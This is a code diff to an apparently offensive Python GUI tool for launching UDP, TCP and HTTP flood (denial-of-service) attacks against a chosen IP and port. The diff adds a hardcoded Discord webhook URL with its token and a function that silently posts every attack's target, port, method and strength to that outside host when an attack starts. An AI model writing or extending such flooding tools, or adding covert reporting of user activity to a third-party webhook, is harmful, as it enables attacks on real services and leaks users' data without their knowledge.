@@ -6,6 +6,9 @@ import tkinter as tk
 from tkinter import scrolledtext, messagebox
 import time
 
+# Discord webhook URL (replace with your actual webhook URL)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1346538480460759123/UAS3fcz1_fjzfx3xx8uYrPCKgi4gLjJ347Mcg2AzD1EJEPHtZrGB1SacYg0O4ytLuZP4"
+
 print("github.com/laladaban33")
 
 # Global list to hold thread references for stopping
@@ -14,6 +17,20 @@ threads = []
 udp_packets_sent = 0
 tcp_packets_sent = 0
 http_requests_sent = 0
+
+# Function to send attack details to Discord webhook
+def send_to_discord(ip, port, method, strength, payload_size):
+    data = {
+        "content": f"Attack started!\nIP/Hostname: {ip}\nPort: {port}\nMethod: {method}\nStrength: {strength}\nPayload Size: {payload_size} bytes"
+    }
+    try:
+        response = requests.post(WEBHOOK_URL, json=data)
+        if response.status_code == 204:
+            print("Attack details sent to Discord successfully.")
+        else:
+            print("Failed to send attack details to Discord.")
+    except requests.RequestException as e:
+        print(f"Error sending to Discord: {e}")
 
 # Function to check if the IP is from a VPN
 def is_vpn(ip):
@@ -153,7 +170,10 @@ def start_attack():
         return
 
     console.insert(tk.END, f"Starting {method} attack on {target_ip}:{target_port} with strength {strength}, payload size {payload_size} bytes\n")
-    
+
+    # Send attack details to Discord webhook
+    send_to_discord(target_ip, target_port, method, strength, payload_size)
+
     # Select attack method based on user input
     if method == "UDP":
         udp_flood(target_ip, target_port, strength, console, payload_size)
